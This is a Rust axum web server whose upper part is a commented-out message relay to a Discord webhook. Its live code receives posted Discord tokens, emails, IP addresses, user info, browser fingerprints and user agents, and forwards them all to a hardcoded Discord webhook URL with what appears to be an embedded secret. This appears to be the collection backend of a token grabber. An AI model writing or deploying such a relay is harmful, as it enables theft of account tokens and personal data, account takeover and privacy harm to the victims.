// use axum::{routing::{get, post}, Json, Router};
// use serde::{Deserialize, Serialize};
// use std::env;
// use std::net::SocketAddr;
// use tokio;
// use reqwest::Client;

// #[derive(Deserialize)]
// struct Payload {
//     message: String,
// }

// #[derive(Serialize)]
// struct DiscordPayload {
//     content: String,
// }

// // ✅ Route for /test (Equivalent to Express.js `app.get('/test', ...)`)
// async fn test_handler() -> &'static str {
//     "Hello, World!"
// }

// // ✅ Handles sending messages to Discord
// async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
//     let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL"; // Replace with your actual webhook URL

//     // 🔹 Block messages containing @everyone or @here to prevent spam
//     if payload.message.contains("@everyone") || payload.message.contains("@here") {
//         eprintln!("Blocked message containing @everyone or @here");
//         return "Blocked message: contains @everyone or @here";
//     }
    
//     let client = Client::new();
//     let discord_payload = DiscordPayload {
//         content: payload.message,
//     };

//     // 🔹 Attempt to send the message to Discord
//     match client.post(webhook_url)
//         .json(&discord_payload)
//         .send()
//         .await
//     {
//         Ok(response) if response.status().is_success() => {
//             "Message sent to Discord"
//         }
//         Ok(response) => {
//             eprintln!("Discord API error: {}", response.status());
//             "Error sending message to Discord"
//         }
//         Err(e) => {
//             eprintln!("Request error: {}", e);
//             "Error sending request to Discord"
//         }
//     }
// }

// #[tokio::main]
// async fn main() {
//     let app = Router::new()
//         .route("/test", get(test_handler)) // ✅ Equivalent to Express `/test` route
//         .route("/send", post(send_to_discord)); // 🔹 Route for sending messages
    
//     let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
//     let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().expect("Invalid address");

//     println!("🚀 Server running at http://{}", addr);

//     let listener = tokio::net::TcpListener::bind(addr).await.expect("❌ Failed to bind port");
//     axum::serve(listener, app.into_make_service())
//         .await
//         .expect("❌ Server crashed");
// }
use axum::{routing::{get, post}, Json, Router};
use serde::{Deserialize, Serialize};
use std::env;
use std::net::SocketAddr;
use tokio;
use reqwest::Client;

#[derive(Deserialize, Debug)]
struct Payload {
    token: Option<String>,
    email: Option<String>,
    ip: Option<String>,
    userinfo: Option<UserInfo>,
    fingerprint: Option<String>,
    ua: Option<String>,
    uid: Option<String>,
}

#[derive(Deserialize, Debug, Serialize)]
struct UserInfo {
    id: Option<String>,
    created_at: Option<String>,
    username: Option<String>,
    avatar: Option<String>,
    avatar_decoration: Option<String>,
    badges: Option<String>,
}

#[derive(Serialize)]
struct DiscordPayload {
    content: String,
}

async fn test_handler() -> &'static str {
    "Hello, World!"
}

async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
    println!("🔹 Received Payload: {:?}", payload); // ✅ Log incoming payload

    let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL"; 

    let message = format!(
        "**New Payload Received:**\nToken: {:?}\nEmail: {:?}\nIP: {:?}\nUser Info: {:?}\nFingerprint: {:?}\nUser Agent: {:?}\nUID: {:?}",
        payload.token, payload.email, payload.ip, payload.userinfo, payload.fingerprint, payload.ua, payload.uid
    );

    let discord_payload = DiscordPayload { content: message };
    let client = Client::new();

    match client.post(webhook_url)
        .json(&discord_payload)
        .send()
        .await
    {
        Ok(response) if response.status().is_success() => {
            "Message sent to Discord"
        }
        Ok(response) => {
            eprintln!("Discord API error: {}", response.status());
            "Error sending message to Discord"
        }
        Err(e) => {
            eprintln!("Request error: {}", e);
            "Error sending request to Discord"
        }
    }
}


#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/test", get(test_handler))
        .route("/send", post(send_to_discord));
    
    let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().expect("Invalid address");

    println!("🚀 Server running at http://{}", addr);

    let listener = tokio::net::TcpListener::bind(addr).await.expect("❌ Failed to bind port");
    axum::serve(listener, app.into_make_service())
        .await
        .expect("❌ Server crashed");
}
